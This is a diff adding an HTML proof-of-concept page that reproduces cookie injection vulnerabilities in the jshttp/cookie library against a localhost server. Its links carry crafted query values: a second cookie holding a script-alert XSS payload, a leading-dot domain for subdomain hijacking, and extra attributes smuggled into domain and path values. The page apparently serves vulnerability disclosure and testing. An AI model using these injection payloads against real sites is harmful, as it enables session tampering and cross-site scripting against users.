@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>jshttp/cookie vuln reproduction</title>
+    <link rel="stylesheet" href="./static/styles.css" />
+  </head>
+  <body>
+    <h1>Reproduction of Arbitrary Cookie Data Injection Vulnerabilities</h1>
+
+    <p>
+      Check the console or Chrome DevTools (Network, Application) for the
+      exploits.
+    </p>
+
+    <h2>Cookie 'name' Exploit:</h2>
+    <p>
+      Injects a second cookie with unencoded value.<br />
+      <pre><a
+          href="http://localhost:3000/set-bad-cookie-name?userName=userName=<script>alert(%27XSS3%27)</script>;+Max-Age=2592000;+a"
+          >?userName=userName=&lt;script>alert(%27XSS3%27)&lt;/script>;+Max-Age=2592000;+a</a
+        >
+      </pre>
+    </p>
+    <h2>Cookie 'domain' Exploit:</h2>
+    <p>
+      Subdomain hijacking with domain name starting with dot.<br />
+      <pre><a
+          href="http://localhost:3000/set-bad-cookie-domain?thisSite=.example.com"
+          >?thisSite=.example.com</a
+        >
+      </pre>
+    </p>
+    Cookie 'domain' 2 Exploit:
+    <p>
+      Inject addition coookie data outside domain value.<br />
+      <pre><a
+          href="http://localhost:3000/set-bad-cookie-domain?thisSite=localhost;+Max-Age=31536000;+SameSite=None;+Secure"
+          >?thisSite=localhost;+Max-Age=31536000;+SameSite=None;+Secure</a
+        >
+      </pre>
+    </p>
+    <h2>Cookie 'path' Exploit:</h2>
+    <p>
+      Inject addition coookie data outside path value.<br />
+      <pre><a
+          href="http://localhost:3000/set-bad-cookie-path?somePath=/;+Max-Age=31536000;+SameSite=None;+Secure"
+          >?somePath=/;+Max-Age=31536000;+SameSite=None;+Secure</a
+        >
+      </pre>
+    </p>
+  </body>
+</html>
